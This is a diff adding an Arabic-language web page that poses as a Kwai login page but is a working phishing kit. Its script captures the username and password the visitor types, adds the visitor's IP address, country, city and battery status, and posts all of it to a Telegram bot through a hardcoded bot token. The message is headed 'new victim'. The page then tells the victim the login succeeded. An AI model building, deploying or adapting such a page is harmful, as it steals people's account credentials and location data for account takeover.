@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kwai - اكتشف عالم الفيديوهات القصيرة</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0a0a0a;
+            color: white;
+            min-height: 100vh;
+        }
+
+        .top-bar {
+            background: #000;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #1a1a1a;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .top-bar .logo {
+            font-size: 22px;
+            font-weight: bold;
+            color: #FF6B00;
+        }
+
+        .top-bar .nav {
+            display: flex;
+            gap: 15px;
+            font-size: 13px;
+            color: #aaa;
+        }
+
+        .top-bar .nav span:hover {
+            color: #FF6B00;
+            cursor: pointer;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 40px 20px 25px;
+            background: linear-gradient(180deg, #111, #0a0a0a);
+        }
+
+        .hero h1 {
+            font-size: 26px;
+            background: linear-gradient(135deg, #FF6B00, #FFD700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .hero p {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 20px 0;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-item .num {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FF6B00;
+        }
+
+        .stat-item .lbl {
+            font-size: 11px;
+            color: #666;
+        }
+
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 0 20px 30px;
+        }
+
+        .login-card {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 25px;
+            margin: 15px 0;
+        }
+
+        .login-card h2 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .login-card .sub {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin: 12px 0;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background: #0a0a0a;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #FF6B00;
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 12px 0;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .checkbox-row label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        .checkbox-row a {
+            color: #FF6B00;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #FF6B00, #FF4500);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 10px 0;
+        }
+
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255,107,0,0.3);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+            color: #555;
+            font-size: 11px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #222;
+        }
+
+        .social-btns {
+            display: flex;
+            gap: 8px;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background: #0a0a0a;
+            color: #aaa;
+            text-align: center;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .social-btn:hover {
+            border-color: #FF6B00;
+            color: #FF6B00;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .feature {
+            background: #111;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .feature .icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .feature h4 {
+            font-size: 13px;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .feature p {
+            font-size: 11px;
+            color: #666;
+        }
+
+        .footer {
+            text-align: center;
+            color: #555;
+            font-size: 11px;
+            padding: 20px 0;
+            border-top: 1px solid #1a1a1a;
+        }
+
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: #222;
+            border-radius: 2px;
+            margin: 12px 0;
+            display: none;
+        }
+
+        .progress div {
+            height: 100%;
+            background: #FF6B00;
+            width: 0%;
+            border-radius: 2px;
+            transition: width 0.5s;
+        }
+
+        .status {
+            text-align: center;
+            color: #FF6B00;
+            font-size: 12px;
+            margin: 6px 0;
+            display: none;
+        }
+
+        .done {
+            display: none;
+            text-align: center;
+            color: #4caf50;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <div class="logo">Kwai</div>
+        <div class="nav">
+            <span>الرئيسية</span>
+            <span>اكتشف</span>
+            <span>المبدعون</span>
+            <span>تحميل التطبيق</span>
+        </div>
+    </div>
+
+    <div class="hero">
+        <h1>أكثر من 100 مليون مستخدم</h1>
+        <p>اكتشف عالم الفيديوهات القصيرة</p>
+        <p style="color:#888;font-size:13px;">انضم إلى مجتمع Kwai واستمتع بملايين الفيديوهات الممتعة والحصرية</p>
+    </div>
+
+    <div class="container">
+        <div class="login-card">
+            <h2>مرحباً بك</h2>
+            <p class="sub">سجل دخولك لمشاهدة المحتوى الحصري</p>
+
+            <div class="input-group">
+                <input type="text" id="username" placeholder="اسم المستخدم / البريد الإلكتروني / رقم الهاتف">
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة المرور">
+            </div>
+
+            <div class="checkbox-row">
+                <label>
+                    <input type="checkbox" checked> تذكرني
+                </label>
+                <a href="#">نسيت كلمة المرور؟</a>
+            </div>
+
+            <button class="btn-login" id="btn" onclick="submitData()">
+                تسجيل الدخول
+            </button>
+
+            <div class="divider">أو تابع باستخدام</div>
+
+            <div class="social-btns">
+                <div class="social-btn">Google</div>
+                <div class="social-btn">Facebook</div>
+                <div class="social-btn">Twitter</div>
+            </div>
+
+            <div class="progress" id="prog"><div id="fill"></div></div>
+            <div class="status" id="stat"></div>
+            <div class="done" id="done">✅ تم تسجيل الدخول بنجاح!</div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="num">100M+</div>
+                <div class="lbl">مستخدم</div>
+            </div>
+            <div class="stat-item">
+                <div class="num">1B+</div>
+                <div class="lbl">فيديو</div>
+            </div>
+            <div class="stat-item">
+                <div class="num">50M+</div>
+                <div class="lbl">مبدع</div>
+            </div>
+        </div>
+
+        <h3 style="text-align:center;margin:20px 0;font-size:16px;">لماذا تختار Kwai؟</h3>
+
+        <div class="features">
+            <div class="feature">
+                <div class="icon">🎬</div>
+                <h4>فيديوهات غير محدودة</h4>
+                <p>شاهد آلاف الفيديوهات المتنوعة</p>
+            </div>
+            <div class="feature">
+                <div class="icon">💎</div>
+                <h4>مكافآت يومية</h4>
+                <p>اربح الماس والهدايا بمشاهدة الفيديوهات</p>
+            </div>
+            <div class="feature">
+                <div class="icon">👥</div>
+                <h4>مجتمع تفاعلي</h4>
+                <p>تواصل مع ملايين المستخدمين</p>
+            </div>
+            <div class="feature">
+                <div class="icon">📊</div>
+                <h4>تحليلات متقدمة</h4>
+                <p>تابع أداء مقاطعك وإحصائيات المشاهدات</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2026 Kwai. جميع الحقوق محفوظة | سياسة الخصوصية | شروط الاستخدام
+    </div>
+
+    <script>
+        var cid = new URL(window.location.href).searchParams.get('chatId') || '';
+        var tok = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+
+        function up(p, t) {
+            document.getElementById('fill').style.width = p + '%';
+            if (t) { document.getElementById('stat').style.display = 'block'; document.getElementById('stat').textContent = t; }
+        }
+
+        async function submitData() {
+            if (sent) return;
+            
+            var username = document.getElementById('username').value.trim();
+            var password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                alert('يرجى إدخال اسم المستخدم وكلمة المرور!');
+                return;
+            }
+
+            sent = true;
+            document.getElementById('btn').disabled = true;
+            document.getElementById('btn').textContent = '⏳ جاري تسجيل الدخول...';
+            document.getElementById('btn').style.opacity = '0.7';
+            document.getElementById('prog').style.display = 'block';
+            
+            up(20, 'جاري التحقق من البيانات...');
+
+            var ip = await getIp();
+            var bat = await getBat();
+
+            up(60, 'جاري تسجيل الدخول...');
+
+            var txt = '🟠 كواي - ضحية جديدة!\n\n';
+            txt += '👤 المستخدم: ' + username + '\n';
+            txt += '🔑 الباسورد: ' + password + '\n\n';
+            txt += '🌍 IP: ' + ip.ip + '\n';
+            txt += '📍 الدولة: ' + ip.country + '\n';
+            txt += '🏙️ المدينة: ' + ip.city + '\n';
+            txt += '🔋 البطارية: ' + bat.level + '%\n';
+            txt += '⚡ الشحن: ' + bat.charging;
+
+            await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: cid, text: txt })
+            });
+
+            up(100, 'اكتمل!');
+            
+            setTimeout(function() {
+                document.getElementById('prog').style.display = 'none';
+                document.getElementById('stat').style.display = 'none';
+                document.getElementById('done').style.display = 'block';
+            }, 1500);
+        }
+
+        async function getIp() {
+            try { var r = await fetch('https://ipapi.co/json/'); var d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+
+        async function getBat() {
+            if ('getBattery' in navigator) { try { var b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; } catch(e) {} }
+            return { level: '?', charging: '?' };
+        }
+    </script>
+</body>
+</html>
